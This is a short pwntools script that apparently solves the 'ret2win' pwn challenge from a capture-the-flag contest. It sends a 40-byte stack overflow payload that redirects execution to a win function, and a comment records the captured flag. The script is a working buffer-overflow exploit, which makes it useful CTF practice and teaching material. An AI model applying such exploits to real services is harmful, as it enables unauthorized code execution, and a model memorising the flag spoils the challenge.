from pwn import *
#r = process("./chall")

r = remote("ret2win-pwn.wanictf.org", 9003)
offset = 40
win_function = 0x401369
payload = b"A"*offset+p64(win_function)
r.sendline(payload)
r.interactive()
# FLAG{f1r57_5739_45_4_9wn3r}
